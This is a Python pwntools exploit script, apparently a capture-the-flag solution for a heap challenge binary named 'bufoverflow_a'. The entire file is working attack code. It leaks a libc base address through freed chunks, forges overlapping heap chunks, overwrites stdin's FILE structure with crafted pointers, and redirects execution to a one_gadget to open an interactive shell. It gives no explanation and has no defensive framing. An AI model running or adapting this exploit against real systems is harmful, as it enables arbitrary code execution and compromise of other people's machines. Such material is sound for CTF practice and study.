from pwn import *

DEBUG=0

p=process('./bufoverflow_a')
elf=ELF('./libc.so.6')

if DEBUG == 1:
  context.log_level='debug'
  gdb.attach(p)

def sd(content):
  p.send(content)

def sl(content):
  p.sendline(content)

def rv(content):
  p.recvuntil(content)

def alloc(size):
  rv('>> ')
  sl('1')
  rv('Size: ')
  sl(str(size))

def delete(index):
  rv('>> ')
  sl('2')
  rv('Index: ')
  sl(str(index))
  
def fill(content):
  rv('>> ')
  sl('3')
  rv('Content: ')
  sd(content)

def show():
  rv('>> ')
  sl('4')
  
stdin=elf.symbols['_IO_2_1_stdin_']
system=elf.symbols['system']
binsh=elf.search('/bin/sh').next()

#---------------------------
# leak, leak, step the first
alloc(0x80)
alloc(0x80)
delete(0)
alloc(0x80)

show()
libc_base=u64((rv('\n').ljust(8,'\x00')))-0x399b58
one_shoot=one_gadget('./libc.so.6',offset=libc_base)

delete(1)
delete(0)

#---------------------------
alloc(0x88)
alloc(0x400)
alloc(0x100)
alloc(0x88)

delete(0)
delete(1)
alloc(0x88)
payload='a'*0x88
fill(payload+'\n')

alloc(0x88)
alloc(0x88)
alloc(0x200)
alloc(0xb8)

delete(1)
delete(2)
delete(5)

alloc(0x518)
payload='a'*0x80
payload+=p64(0)+p64(0x91)
payload+='b'*0x80
payload+=p64(0)+p64(0x211)
payload+=p64(0)+p64(stdin+0x30)
fill(payload+'\n')

alloc(0x208)
payload='\x00'*5
payload+=p64(libc_base+0x39b770)
payload+=p64(0xffffffffffffffff)+p64(0)
payload+=p64(libc_base+0x3999a0)+p64(0)
payload+=p64(0)*2
payload+=p64(0xffffffff)+p64(0)
payload+=p64(0)+p64(libc_base+0x396440)
payload+='\x00'*0x130
payload+=p64(libc_base+0x395f00)+p64(0)
payload+=p64(libc_base+0x7c610)+p64(0)
payload+=p64(one_shoot[2])
sl(payload)

p.interactive()
